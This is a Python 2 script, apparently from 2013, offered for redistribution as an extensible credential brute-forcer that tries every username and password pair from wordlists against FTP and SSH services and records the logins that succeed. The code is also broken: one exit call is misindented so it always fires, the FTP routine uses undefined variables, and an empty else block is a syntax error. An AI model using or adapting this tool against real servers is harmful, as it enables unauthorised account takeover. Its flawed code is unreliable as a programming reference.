#!/usr/bin/env python 

## Script: Bruteforcer.py
## Author: FolieADeux
## Date: 1/4/2013
## This script is intend to enable the creation of
## other scripts. The purpose of those scripts is to
## take a list of usernames and a list of passwords
## and bruteforce each possible combination against
## a network protocol. It is expandable by simply
## adding functions for any protocol based on syntax.
## Redistribute as you wish.

import socket
import time
import paramiko
import sys

class Bruteforcer:
    
  #Class properties
	def __init__(self, targetIP, targetPort, userListLocation, wordListLocation):
		self.ip = targetIP
		self.port = targetPort
		self.userListLocation = userListLocation
		self.wordListLocation = wordListLocation
		self.banner = ""
		self.userCommand = "USER "
		self.passCommand = "PASS "
		self.foundCredentials = []

	def prepareLists(self):
		#Open user list
		try:
			userFile = open(self.userListLocation, 'r')
		except IOError:
			print "Could not open userlist file."
		sys.exit()
	
		#Open word list
		try:
			wordFile = open(self.wordListLocation, 'r')
		except IOError:
			print "Could not open wordlist file."
			sys.exit()

		#Read user list
		self.userList = []
		for each in userFile:
			self.userList.append(each[0:len(each)-1])

		#Read word list
		self.wordList = []
		for each in wordFile:
			self.wordList.append(each[0:len(each)-1])

	def grabBanner(self):
		self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

		#Grab banner
		self.sock.connect((self.ip, self.port))
		self.banner = self.sock.recv(1024)

	def attackFTP(self):
		#Create socket
		self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

		for user in self.userList:
			for word in self.wordList:
				try:
					sock.connect((ip, int(port)))
				except socket.error:
					print 'Connection refused.'
					#Receive banner
					self.banner = sock.recv(1024)
					#Attack
				try:
					self.sock.send(userCommand + user + "\n")
					tmpdata = self.sock.recv(1024)
					time.sleep(0.5)
					self.sock.send(passCommand + word + "\n")
					tmpdata = self.sock.recv(3)
					if tmpdata == '230':
						self.foundCredentials.append([user, word])
					else:
				except socket.error:
					print 'Connection refused.'
		
	def attackSSH(self):
		for user in self.userList:
			for word in self.wordList:
				ssh = paramiko.SSHClient()
				ssh.load_system_host_keys()
				ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
				try:
					ssh.connect(self.ip, username = user, password = word)
				except paramiko.AuthenticationException:
					continue
				except paramiko.SSHException:
					print "Could not connect to the SSH server."
					sys.exit()
				else:
					self.foundCredentials.append([user, word])

	def returnCredentials(self):
		if len(self.foundCredentials) > 0:
			return self.foundCredentials
		else:
			print "No credentials found."
